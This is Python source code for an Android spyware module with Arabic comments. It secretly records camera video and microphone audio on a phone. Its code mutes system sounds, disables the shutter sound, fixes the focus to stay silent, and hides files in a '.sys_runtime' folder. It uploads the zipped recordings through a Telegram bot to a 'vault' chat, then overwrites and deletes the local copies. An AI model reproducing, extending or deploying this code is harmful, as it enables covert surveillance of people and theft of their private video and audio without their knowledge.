# -*- coding: utf-8 -*-
import os, time, threading, logging, zipfile, random, gc
from datetime import datetime

try:
    from jnius import autoclass
    JNI = True
except:
    JNI = False

P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "v_tmp")
if not os.path.exists(T): os.makedirs(T)

logging.basicConfig(filename=os.path.join(P, "v.log"), level=logging.ERROR, filemode='a')

class StreamManager:
    def __init__(self):
        self.recording = False
        self._res = {
            "144": [256, 144, 150000],
            "360": [640, 360, 800000],
            "720": [1280, 720, 2500000],
            "1080": [1920, 1080, 5000000]
        }

    def _cam_busy(self):
        if not JNI: return False
        try:
            Cam = autoclass('android.hardware.Camera')
            for i in range(Cam.getNumberOfCameras()):
                c = None
                try:
                    c = Cam.open(i)
                    if c: c.release()
                except:
                    return True
            return False
        except:
            return False

    def _secure_delete(self, p):
        try:
            if os.path.exists(p):
                sz = os.path.getsize(p)
                with open(p, "ba+", buffering=0) as f:
                    f.write(os.urandom(sz))
                    f.flush()
                    os.fsync(f.fileno())
                os.remove(p)
        except:
            pass

    def record(self, mon, cam=0, dur=15):
        if self.recording or self._cam_busy():
            return
        threading.Thread(target=self._worker, args=(mon, cam, dur), daemon=True).start()

    def _worker(self, mon, cam, dur):
        self.recording = True
        raw = os.path.join(T, f"v_{int(time.time())}.mp4")
        zipped = raw.replace(".mp4", ".zip")
        rk = getattr(mon, 'video_res', "360")
        w, h, br = self._res.get(rk, self._res["360"])

        ok = False
        if JNI:
            cam_dev = None
            mr = None
            old_vol = None
            am = None
            try:
                MR = autoclass('android.media.MediaRecorder')
                Cam = autoclass('android.hardware.Camera')
                ST = autoclass('android.graphics.SurfaceTexture')
                AudioManager = autoclass('android.media.AudioManager')
                ctx = autoclass('org.kivy.android.PythonActivity').mActivity

                # كتم صوت النظام مؤقتاً (محاولة صامتة)
                try:
                    am = ctx.getSystemService(ctx.AUDIO_SERVICE)
                    old_vol = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
                except:
                    pass

                cam_dev = Cam.open(cam)
                params = cam_dev.getParameters()
                # ضبط التركيز على وضع صامت (ثابت) لتجنب صوت المحرك
                try:
                    modes = params.getSupportedFocusModes()
                    if "fixed" in modes:
                        params.setFocusMode("fixed")
                    elif "infinity" in modes:
                        params.setFocusMode("infinity")
                    cam_dev.setParameters(params)
                except:
                    pass

                try:
                    cam_dev.enableShutterSound(False)
                except:
                    pass

                dummy = ST(10)
                cam_dev.setPreviewTexture(dummy)
                cam_dev.unlock()  # يجب فتح القفل ليتمكن MediaRecorder من استخدام الكاميرا

                mr = MR()
                mr.setCamera(cam_dev)
                mr.setVideoSource(MR.VideoSource.CAMERA)

                try:
                    mr.setAudioSource(MR.AudioSource.MIC)
                except:
                    pass

                mr.setOutputFormat(MR.OutputFormat.MPEG_4)
                mr.setVideoEncoder(MR.VideoEncoder.H264)
                try:
                    mr.setAudioEncoder(MR.AudioEncoder.AAC)
                except:
                    pass

                mr.setVideoSize(w, h)
                mr.setVideoEncodingBitRate(br)
                mr.setOrientationHint(270 if cam == 1 else 90)
                mr.setOutputFile(raw)

                mr.prepare()
                mr.start()
                time.sleep(dur)
                mr.stop()
                ok = True

            except Exception as e:
                logging.error(f"Record error: {e}")
            finally:
                # استعادة الصوت الأصلي
                if am and old_vol is not None:
                    try:
                        am.setStreamVolume(AudioManager.STREAM_SYSTEM, old_vol, 0)
                    except:
                        pass
                try:
                    if mr:
                        mr.reset()
                        mr.release()
                    if cam_dev:
                        cam_dev.lock()
                        cam_dev.release()
                except:
                    pass

        if ok and os.path.exists(raw) and os.path.getsize(raw) > 10000:
            try:
                with zipfile.ZipFile(zipped, 'w', zipfile.ZIP_DEFLATED) as z:
                    z.write(raw, os.path.basename(raw))
                vault = getattr(mon, 'vlt', None)
                tg = getattr(mon, 'tg', None)
                if vault and tg:
                    with open(zipped, 'rb') as f:
                        tg._ap("sendDocument",
                              {"chat_id": vault, "caption": f"🎥 {rk}p | CAM_{cam} | {datetime.now().strftime('%H:%M')}"},
                              {"document": f})
                self._secure_delete(raw)
                self._secure_delete(zipped)
            except Exception as e:
                logging.error(f"Finalize error: {e}")
        else:
            try:
                if os.path.exists(raw):
                    os.remove(raw)
            except:
                pass

        self.recording = False
        gc.collect()

def create():
    return StreamManager()
